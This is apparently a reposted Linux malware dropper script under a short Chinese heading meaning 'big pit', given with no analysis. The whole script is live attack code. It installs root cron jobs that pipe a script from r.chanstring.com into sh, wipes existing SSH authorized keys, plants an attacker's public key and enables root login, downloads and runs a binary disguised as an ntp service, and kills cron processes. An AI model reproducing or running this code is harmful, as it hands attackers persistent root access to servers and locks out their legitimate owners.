### 大坑

export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin

echo "*/10 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/10 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/crontabs/root

if [ ! -f "/root/.ssh/KHK75NEOiq" ]; then
	mkdir -p ~/.ssh
	rm -f ~/.ssh/authorized_keys*
	echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root" > ~/.ssh/KHK75NEOiq
	echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
	echo "RSAAuthentication yes" >> /etc/ssh/sshd_config
	echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
	echo "AuthorizedKeysFile .ssh/KHK75NEOiq" >> /etc/ssh/sshd_config
	/etc/init.d/sshd restart
fi

if [ ! -f "/etc/init.d/ntp" ]; then
	if [ ! -f "/etc/systemd/system/ntp.service" ]; then
		mkdir -p /opt
		curl -fsSL https://r.chanstring.com/v51/lady_`uname -m` -o /opt/KHK75NEOiq33 && chmod +x /opt/KHK75NEOiq33 && /opt/KHK75NEOiq33 -Install
	fi
fi



# service ntp start
# systemctl restart ntp.service
/etc/init.d/ntp start

# rm -rf /etc/init.d/ntp
# ps auxf|grep -v grep|grep "/usr/sbin/ntp -D"|awk '{print $2}'|xargs kill -9

ps auxf|grep -v grep|grep "/usr/bin/cron"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/opt/cron"|awk '{print $2}'|xargs kill -9